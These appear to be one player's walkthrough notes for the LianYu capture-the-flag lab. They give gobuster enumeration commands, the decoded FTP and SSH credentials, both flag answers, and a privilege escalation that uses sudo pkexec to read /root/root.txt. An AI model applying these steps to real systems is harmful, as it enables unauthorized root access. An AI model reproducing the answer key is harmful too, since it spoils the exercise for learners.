#export ip=10.10.59.15

#vigilante | username
#RTy8yhBQdscX encoded in base58 | decoded value: !#th3h00d

===============================================
#1	Deploy the VM and Start the Enumeration.
	Ans: no answer needed.
------------------------------------------------
gobuster dir -u http://10.10.3.33/island/2100/ -w fuz.txt 
#	createtd own word list using {crunch} 0-9999 digits.

#2	What is the Web Directory you found?
	Ans: 2100
------------------------------------------------
gobuster dir -u http://10.10.3.33/island/2100/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .ticket

#3 	what is the file name you found?
	Ans: green_arrow.ticket
------------------------------------------------

#4 	what is the FTP Password?
	Ans: !#th3h00d
------------------------------------------------

#5 	what is the file name with SSH password?
	Ans: shado and the passwd for ssh: M3tahuman and usr:slade
------------------------------------------------

#6 	user.txt
	Ans: THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
------------------------------------------------

Priv excalation: sudo -l
---------------------------------------------------------
sudo -l
[sudo] password for slade: 
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
---------------------------------------------------------

pkexec can run admin previleges so sudo /usr/bin/pkexec cat /root/root.txt

#7 	root.txt
	Ans: THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}


=====================The End====================